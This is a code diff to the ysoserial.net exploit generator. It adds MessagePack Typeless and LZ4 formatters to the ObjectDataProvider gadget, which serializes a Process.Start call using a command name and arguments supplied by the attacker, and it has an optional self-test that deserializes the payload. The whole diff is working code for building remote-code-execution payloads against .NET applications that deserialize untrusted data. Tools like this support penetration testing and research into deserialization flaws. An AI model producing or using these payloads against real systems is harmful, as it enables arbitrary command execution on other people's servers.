@@ -32,7 +32,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Xaml (4)", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer (2)", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler", "SharpSerializerBinary", "SharpSerializerXml" };
+            return new List<string> { "Xaml (4)", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer (2)", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler", "SharpSerializerBinary", "SharpSerializerXml", "MessagePackTypeless", "MessagePackTypelessLz4" };
         }
 
         public override OptionSet Options()
@@ -637,7 +637,7 @@ namespace ysoserial.Generators
                 psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                 Process p = new Process();
                 p.StartInfo = psi;
-                
+
                 ObjectDataProvider odp = new ObjectDataProvider();
                 odp.MethodName = "Start";
                 odp.IsInitialLoadEnabled = false;
@@ -662,7 +662,7 @@ namespace ysoserial.Generators
                 {
                     ourExcludedProperties = psi.GetType().GetProperties().Where(x => !x.Name.Equals("FileName") && !x.Name.Equals("Arguments")).Select(item => item.Name).ToList();
                 }
-                    
+
                 exclusionList = new KeyValuePair<Type, List<String>>(psi.GetType(), ourExcludedProperties);
                 allExclusions.Add(exclusionList);
 
@@ -703,7 +703,38 @@ namespace ysoserial.Generators
                         catch { }
                     }
                     return serializedData;
-                } 
+                }
+            }
+            else if (formatter.ToLowerInvariant().Equals("messagepacktypeless") || formatter.ToLowerInvariant().Equals("messagepacktypelesslz4"))
+            {
+                if (formatter.ToLowerInvariant().Equals("messagepacktypeless"))
+                {
+                    var serializedData = MessagePackObjectDataProviderHelper.CreateObjectDataProviderGadget(inputArgs.CmdFileName, inputArgs.CmdArguments, false);
+
+                    if (inputArgs.Test)
+                    {
+                        try
+                        {
+                            MessagePackObjectDataProviderHelper.Test(serializedData, false);
+                        }
+                        catch { }
+                    }
+                    return serializedData;
+                }
+                else // LZ4
+                {
+                    var serializedData = MessagePackObjectDataProviderHelper.CreateObjectDataProviderGadget(inputArgs.CmdFileName, inputArgs.CmdArguments, true);
+
+                    if (inputArgs.Test)
+                    {
+                        try
+                        {
+                            MessagePackObjectDataProviderHelper.Test(serializedData, true);
+                        }
+                        catch { }
+                    }
+                    return serializedData;
+                }
             }
             else
             {
